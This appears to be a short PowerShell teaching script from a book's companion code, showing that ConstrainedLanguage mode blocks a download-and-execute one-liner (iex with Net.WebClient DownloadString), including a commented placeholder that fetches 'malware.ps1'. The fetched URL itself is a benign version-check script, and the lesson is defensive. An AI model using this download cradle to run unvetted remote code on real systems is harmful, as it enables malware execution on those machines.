#current language mode
$ExecutionContext.SessionState.LanguageMode 

#region Executing malware from the internet
#Using TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

#(New ObjectNet.WebClient).DownloadString(‘https://[website]/malware.ps1′)
#example with $PSVersionTable
iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PacktPublishing/Learn-PowerShell-Core-6.0/master/Chapter01/RetrieveVersion.ps1'))

#endregion

#Changing the language mode
$ExecutionContext.SessionState.LanguageMode = [System.Management.Automation.PSLanguageMode]::ConstrainedLanguage

#current language mode
$ExecutionContext.SessionState.LanguageMode 

#region Executing malware from the internet in ConstrainedLanguageMode
#Using TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

#(New ObjectNet.WebClient).DownloadString(‘https://[website]/malware.ps1′)
#example with $PSVersionTable
iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PacktPublishing/Learn-PowerShell-Core-6.0/master/Chapter01/RetrieveVersion.ps1'))

#endregion




#Setting langauge mode back
$ExecutionContext.SessionState.LanguageMode = [System.Management.Automation.PSLanguageMode]::FullLanguage

